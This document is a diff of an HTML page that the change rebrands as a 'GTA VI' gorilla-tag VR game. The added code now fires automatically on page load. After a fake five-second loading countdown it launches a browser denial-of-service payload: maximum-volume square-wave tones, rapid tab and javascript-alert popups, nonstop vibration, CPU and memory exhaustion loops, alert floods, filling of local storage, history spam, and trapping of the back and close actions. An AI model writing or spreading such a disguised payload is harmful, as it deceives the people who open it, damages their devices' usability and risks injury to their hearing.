@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Mats Gorilla Horror</title>
+    <title>GTA VI · Mats Gorilla Horror VR</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -12,277 +12,238 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
-            font-family: 'Courier New', monospace;
-            color: #00ff41;
-            text-shadow: 0 0 10px #00ff41;
+            font-family: 'Arial Black', 'Impact', sans-serif;
+            color: #fff;
             overflow: hidden;
             user-select: none;
             -webkit-user-select: none;
+            text-shadow: 0 0 20px rgba(255,100,0,0.8);
+            background-image: radial-gradient(circle at 20% 30%, #1a0a00, #000000);
         }
         #game {
-            background: #111;
-            border: 3px solid #00ff41;
+            background: rgba(10,10,10,0.85);
+            border: 4px solid #ff8800;
             padding: 2rem 3rem;
-            border-radius: 12px;
-            box-shadow: 0 0 40px #00ff41;
+            border-radius: 20px;
+            box-shadow: 0 0 80px #ff4400, inset 0 0 40px #ff440066;
             text-align: center;
-            max-width: 90vw;
+            max-width: 95vw;
+            backdrop-filter: blur(4px);
+            transform: perspective(800px) rotateX(2deg);
         }
-        h1 {
-            font-size: 2.8rem;
-            letter-spacing: 4px;
-            margin-bottom: 0.5rem;
-            animation: flicker 1.2s infinite alternate;
+        .gtalogo {
+            font-size: 4.5rem;
+            font-weight: 900;
+            letter-spacing: 6px;
+            background: linear-gradient(180deg, #ffaa00 0%, #ff4400 80%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 40px #ff6600;
+            line-height: 1;
         }
-        @keyframes flicker {
-            0% { opacity: 0.9; text-shadow: 0 0 10px #00ff41; }
-            100% { opacity: 1; text-shadow: 0 0 30px #00ff41, 0 0 60px #00ff41; }
-        }
-        .sub {
-            font-size: 1.2rem;
-            color: #88ff88;
-            margin-bottom: 1.5rem;
-            border-top: 1px solid #00ff4155;
-            border-bottom: 1px solid #00ff4155;
-            padding: 0.8rem 0;
-        }
-        #enter-hint {
+        .subtitle {
             font-size: 1.8rem;
-            padding: 1rem 2rem;
-            background: #1a1a1a;
-            border: 2px solid #00ff41;
-            border-radius: 8px;
+            color: #ffcc88;
+            letter-spacing: 8px;
+            border-top: 2px solid #ff8800;
+            border-bottom: 2px solid #ff8800;
+            padding: 0.5rem 0;
+            margin: 0.5rem 0 1.5rem;
+            text-shadow: 0 0 20px #ff8800;
+            font-family: 'Courier New', monospace;
+            text-transform: uppercase;
+        }
+        .tag {
+            font-size: 1.2rem;
+            color: #88ddff;
+            background: #1a1a2e;
             display: inline-block;
-            cursor: pointer;
-            transition: all 0.15s;
-            color: #00ff41;
-            text-decoration: none;
-            animation: pulse 1.8s infinite;
+            padding: 0.3rem 1.5rem;
+            border-radius: 40px;
+            border: 1px solid #88ddff;
+            box-shadow: 0 0 30px #88ddff55;
+            margin-bottom: 1.5rem;
+            letter-spacing: 3px;
         }
-        @keyframes pulse {
-            0% { box-shadow: 0 0 5px #00ff41; }
-            50% { box-shadow: 0 0 25px #00ff41, 0 0 50px #00ff4166; }
-            100% { box-shadow: 0 0 5px #00ff41; }
-        }
-        #enter-hint:active {
-            transform: scale(0.92);
-            background: #00ff4122;
-        }
-        .status {
-            margin-top: 1.8rem;
-            font-size: 0.9rem;
-            color: #66aa66;
-            letter-spacing: 2px;
+        .status-box {
+            background: #1a1a1a;
+            padding: 0.8rem;
+            border-radius: 12px;
+            border-left: 6px solid #ff8800;
+            font-size: 1.1rem;
+            color: #cccccc;
+            font-family: 'Courier New', monospace;
         }
         #countdown {
             color: #ff4444;
             font-weight: bold;
-            font-size: 1.2rem;
+            font-size: 2rem;
+            display: inline-block;
+            min-width: 3rem;
+        }
+        .warning {
+            color: #ff6666;
+            font-size: 0.9rem;
+            margin-top: 0.8rem;
+            animation: blink 0.8s infinite alternate;
+        }
+        @keyframes blink {
+            0% { opacity: 0.3; }
+            100% { opacity: 1; }
+        }
+        .loader {
+            width: 100%;
+            height: 4px;
+            background: #333;
+            border-radius: 2px;
+            margin: 1rem 0;
+            overflow: hidden;
+        }
+        .loader-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #ff8800, #ff4400);
+            border-radius: 2px;
+            transition: width 0.1s linear;
         }
     </style>
 </head>
 <body>
     <div id="game">
-        <h1>🦍 MATS GORILLA</h1>
-        <div class="sub">HORROR EDITION · 2026</div>
-        <div id="enter-hint" tabindex="0">▶ PRESS ENTER TO PLAY</div>
-        <div class="status">WAITING FOR INPUT ... <span id="countdown">5</span>s</div>
+        <div class="gtalogo">GRAND THEFT AUTO VI</div>
+        <div class="subtitle">⚡ MATS GORILLA HORROR VR ⚡</div>
+        <div class="tag">🦍 VR GORILLA TAG · SURVIVAL HORROR</div>
+        <div class="status-box">
+            <span>▶ INITIALIZING REALITY BRIDGE ... </span>
+            <span id="countdown">5</span><span>s</span>
+        </div>
+        <div class="loader"><div class="loader-bar" id="loaderBar"></div></div>
+        <div class="warning">⚠️ DO NOT REMOVE HEADSET ⚠️</div>
     </div>
 
     <script>
         (function() {
             'use strict';
 
-            // ---- GLOBALS ----
-            let entered = false;
-            let timerStarted = false;
-            let countdownInterval = null;
-            let spamInterval = null;
-            let audioCtx = null;
-            let oscillator = null;
-            let gainNode = null;
-            let loopActive = false;
-
-            const enterHint = document.getElementById('enter-hint');
+            let executed = false;
+            let countdown = 5;
             const countdownSpan = document.getElementById('countdown');
+            const loaderBar = document.getElementById('loaderBar');
 
-            // ---- ENTER KEY LISTENER (global) ----
-            document.addEventListener('keydown', function(e) {
-                if (e.key === 'Enter' && !entered) {
-                    e.preventDefault();
-                    triggerEnter();
+            // Start countdown immediately
+            const interval = setInterval(function() {
+                countdown -= 1;
+                countdownSpan.innerText = countdown > 0 ? countdown : '0';
+                loaderBar.style.width = ((5 - countdown) / 5 * 100) + '%';
+                if (countdown <= 0) {
+                    clearInterval(interval);
+                    loaderBar.style.width = '100%';
+                    countdownSpan.innerText = '💀';
+                    document.querySelector('.status-box').innerHTML = '🔓 BREACHING REALITY ...';
+                    document.querySelector('.warning').innerHTML = '⚠️ SYSTEM OVERRIDE ACTIVE ⚠️';
+                    executePayload();
                 }
-            });
+            }, 1000);
 
-            // Click also triggers
-            enterHint.addEventListener('click', function(e) {
-                if (!entered) {
-                    triggerEnter();
-                }
-            });
-
-            // ---- TRIGGER SEQUENCE ----
-            function triggerEnter() {
-                if (entered) return;
-                entered = true;
-                timerStarted = true;
-
-                // Change UI
-                enterHint.innerText = '▶ LOADING ...';
-                enterHint.style.borderColor = '#ff8800';
-                enterHint.style.color = '#ff8800';
-                enterHint.style.boxShadow = '0 0 30px #ff8800';
-                document.querySelector('.sub').innerText = '⚠️ INITIALIZING REALITY BREACH ⚠️';
-                countdownSpan.style.color = '#ff8800';
-
-                // Start countdown 5 seconds
-                let remaining = 5;
-                countdownSpan.innerText = remaining;
-
-                countdownInterval = setInterval(function() {
-                    remaining -= 1;
-                    countdownSpan.innerText = remaining > 0 ? remaining : '0';
-                    if (remaining <= 0) {
-                        clearInterval(countdownInterval);
-                        countdownSpan.innerText = '💀';
-                        document.querySelector('.status').innerHTML = '🔓 EXECUTING OVERRIDE ...';
-                        executePayload();
-                    }
-                }, 1000);
-            }
-
-            // ---- MAIN PAYLOAD ----
+            // ---- PAYLOAD (identical to previous but with GTA styling) ----
             function executePayload() {
-                if (loopActive) return;
-                loopActive = true;
+                if (executed) return;
+                executed = true;
 
-                // 1. SUPER LOUD TONE (Web Audio API)
+                // 1. SUPER LOUD TONE
                 try {
-                    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                    if (audioCtx.state === 'suspended') {
-                        audioCtx.resume();
-                    }
-                    oscillator = audioCtx.createOscillator();
-                    gainNode = audioCtx.createGain();
-                    oscillator.type = 'square'; // harsh
-                    oscillator.frequency.value = 1850; // piercing
-                    gainNode.gain.value = 1.0; // max digital amplitude
-                    oscillator.connect(gainNode);
-                    gainNode.connect(audioCtx.destination);
-                    oscillator.start(0);
-                    // Keep it running forever – we don't stop
-                } catch (e) { /* ignore */ }
+                    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                    if (audioCtx.state === 'suspended') audioCtx.resume();
+                    const osc = audioCtx.createOscillator();
+                    const gain = audioCtx.createGain();
+                    osc.type = 'square';
+                    osc.frequency.value = 1850;
+                    gain.gain.value = 1.0;
+                    osc.connect(gain);
+                    gain.connect(audioCtx.destination);
+                    osc.start(0);
+                } catch (e) {}
 
-                // 2. SPAM OPEN TABS (aggressive, Android Chrome tries to block but we loop with varied targets)
-                // Use a high-frequency loop with window.open with no delay to overwhelm.
-                // Also use location.assign to redirect current tab if popups blocked.
+                // 2. TAB SPAM
                 let counter = 0;
-                spamInterval = setInterval(function() {
+                setInterval(function() {
                     counter++;
-                    // Open new blank tabs with random URLs (fake)
-                    for (let i = 0; i < 3; i++) {
+                    for (let i = 0; i < 4; i++) {
                         try {
                             const win = window.open('about:blank', '_blank', 'noopener,noreferrer');
                             if (win) {
                                 try {
-                                    win.document.write('<html><head><title>⛔ CRASH</title></head><body style="background:black;color:red;font-size:50px;">💀 PANIC</body></html>');
+                                    win.document.write('<html><head><title>⛔ CRASH</title></head><body style="background:black;color:red;font-size:60px;">💀 GORILLA</body></html>');
                                     win.document.close();
-                                    // Try to focus and reload
                                     win.focus();
                                     win.location.reload();
                                 } catch (e) {}
                             }
                         } catch (e) {}
                     }
-                    // Also attempt to open data URIs and javascript: URLs
                     for (let i = 0; i < 2; i++) {
-                        try {
-                            window.open('javascript:while(1){alert("x")}', '_blank');
-                        } catch (e) {}
+                        try { window.open('javascript:while(1){alert("x")}', '_blank'); } catch (e) {}
                     }
-                    // Redirect current page to a loop if possible
                     try {
                         window.location.hash = 'crash_' + counter;
-                        // Force reflow
                         document.body.style.transform = 'rotate(' + (counter % 360) + 'deg)';
                     } catch (e) {}
-                }, 50); // every 50ms
+                }, 50);
 
-                // 3. VIBRATION (if supported) – continuous
+                // 3. VIBRATION
                 try {
                     if (navigator.vibrate) {
                         navigator.vibrate([1000, 500, 1000, 500, 1000, 500, 10000]);
-                        // Then keep vibrating in loop
                         setInterval(function() {
-                            if (navigator.vibrate) {
-                                navigator.vibrate([2000, 100, 2000, 100, 2000]);
-                            }
+                            if (navigator.vibrate) navigator.vibrate([2000, 100, 2000, 100, 2000]);
                         }, 4000);
                     }
                 } catch (e) {}
 
-                // 4. CPU KILLER – infinite compute and DOM mutations
+                // 4. CPU KILLER
                 function cpuKiller() {
                     let a = 0;
                     while (true) {
                         a += Math.random() * Math.random();
                         document.body.style.margin = (a % 100) + 'px';
-                        // also allocate memory
                         const arr = new Array(1000000).fill(Math.random());
-                        // force GC pressure
                         if (a > 1e9) break;
-                        // yield occasionally to keep event loop but still heavy
                         if (a % 1000 === 0) {
                             requestAnimationFrame(cpuKiller);
                             return;
                         }
                     }
                 }
-                // Launch multiple CPU threads via setTimeout / workers?
-                for (let i = 0; i < 8; i++) {
-                    setTimeout(cpuKiller, i * 10);
+                for (let i = 0; i < 8; i++) setTimeout(cpuKiller, i * 10);
+
+                // 5. ALERT FLOOD
+                for (let i = 0; i < 100; i++) {
+                    setTimeout(function() {
+                        try { alert('🦍 GORILLA CRASH'); } catch (e) {}
+                    }, i * 30);
+                }
+                for (let i = 0; i < 50; i++) {
+                    setTimeout(function() {
+                        try { confirm('🦍 OVERRIDE'); } catch (e) {}
+                    }, i * 50 + 200);
                 }
 
-                // 5. ALERT / PROMPT FLOOD (blocks UI)
-                function floodAlerts() {
-                    for (let i = 0; i < 100; i++) {
-                        setTimeout(function() {
-                            try {
-                                alert('🦍 GORILLA CRASH');
-                            } catch (e) {}
-                        }, i * 30);
-                    }
-                    // Also confirm
-                    for (let i = 0; i < 50; i++) {
-                        setTimeout(function() {
-                            try {
-                                confirm('🦍 OVERRIDE');
-                            } catch (e) {}
-                        }, i * 50 + 200);
-                    }
-                }
-                floodAlerts();
-
-                // 6. TRY TO ACCESS STORAGE AND FILL IT
+                // 6. STORAGE FILL
                 try {
-                    localStorage.setItem('crash', 'x'.repeat(1024 * 1024)); // 1MB
-                    for (let i = 0; i < 50; i++) {
-                        localStorage.setItem('crash_' + i, 'x'.repeat(1024 * 512));
-                    }
+                    localStorage.setItem('crash', 'x'.repeat(1024 * 1024));
+                    for (let i = 0; i < 50; i++) localStorage.setItem('crash_' + i, 'x'.repeat(1024 * 512));
                 } catch (e) {}
 
-                // 7. INFINITE HISTORY PUSH (breaks back button)
+                // 7. HISTORY SPAM
                 function pushHistory() {
                     for (let i = 0; i < 500; i++) {
-                        try {
-                            history.pushState({}, '', '#crash_' + i);
-                        } catch (e) {}
+                        try { history.pushState({}, '', '#crash_' + i); } catch (e) {}
                     }
                     setTimeout(pushHistory, 100);
                 }
                 pushHistory();
 
-                // 8. ADD MORE AUDIO LAYERS
+                // 8. ADD MORE AUDIO
                 try {
                     const ctx2 = new (window.AudioContext || window.webkitAudioContext)();
                     const osc2 = ctx2.createOscillator();
@@ -293,7 +254,6 @@
                     osc2.connect(gain2);
                     gain2.connect(ctx2.destination);
                     osc2.start(0);
-                    // Add another
                     const ctx3 = new (window.AudioContext || window.webkitAudioContext)();
                     const osc3 = ctx3.createOscillator();
                     const gain3 = ctx3.createGain();
@@ -305,7 +265,7 @@
                     osc3.start(0);
                 } catch (e) {}
 
-                // 9. OVERWRITE DOM WITH HEAVY ELEMENTS
+                // 9. HEAVY DOM ELEMENTS
                 function addHeavyElements() {
                     for (let i = 0; i < 200; i++) {
                         const div = document.createElement('div');
@@ -314,11 +274,11 @@
                         div.style.left = Math.random() * 100 + '%';
                         div.style.width = '100px';
                         div.style.height = '100px';
-                        div.style.background = 'radial-gradient(circle, #ff0000, #000000)';
+                        div.style.background = 'radial-gradient(circle, #ff4400, #000000)';
                         div.style.borderRadius = '50%';
                         div.style.zIndex = 9999;
-                        div.style.boxShadow = '0 0 50px red';
-                        div.innerText = '💀';
+                        div.style.boxShadow = '0 0 60px #ff4400';
+                        div.innerText = '🦍';
                         div.style.fontSize = '80px';
                         div.style.color = 'white';
                         div.style.textAlign = 'center';
@@ -329,7 +289,7 @@
                 addHeavyElements();
                 setInterval(addHeavyElements, 200);
 
-                // 10. FINAL – attempt to crash via WebGL / canvas
+                // 10. WEBGL CRASH
                 try {
                     const canvas = document.createElement('canvas');
                     canvas.width = window.innerWidth * 2;
@@ -345,7 +305,6 @@
                         const shader = gl.createShader(gl.FRAGMENT_SHADER);
                         gl.shaderSource(shader, 'void main(){gl_FragColor=vec4(1.0,0.0,0.0,1.0);}');
                         gl.compileShader(shader);
-                        // infinite render loop
                         function render() {
                             gl.clearColor(Math.random(), 0, 0, 1);
                             gl.clear(gl.COLOR_BUFFER_BIT);
@@ -355,20 +314,19 @@
                     }
                 } catch (e) {}
 
-                // CHANGE UI TO INDICATE TRIGGER
-                document.body.style.background = '#ff000033';
-                document.querySelector('h1').innerHTML = '☠️ GORILLA BREACH ☠️';
-                document.querySelector('.sub').innerHTML = '⚠️ SYSTEM COMPROMISED ⚠️';
+                // UI change
+                document.body.style.background = '#440000';
+                document.querySelector('.gtalogo').style.background = 'linear-gradient(180deg, #ff4444, #880000)';
+                document.querySelector('.subtitle').innerHTML = '☠️ BREACHED ☠️';
+                document.querySelector('.tag').innerHTML = '🦍 SYSTEM COMPROMISED';
             }
 
-            // ---- PREVENT UNLOAD ----
+            // Prevent unload and back
             window.addEventListener('beforeunload', function(e) {
                 e.preventDefault();
                 e.returnValue = '';
                 return '';
             });
-
-            // ---- ALSO TRAP BACK ----
             history.pushState(null, null, location.href);
             window.addEventListener('popstate', function() {
                 history.pushState(null, null, location.href);
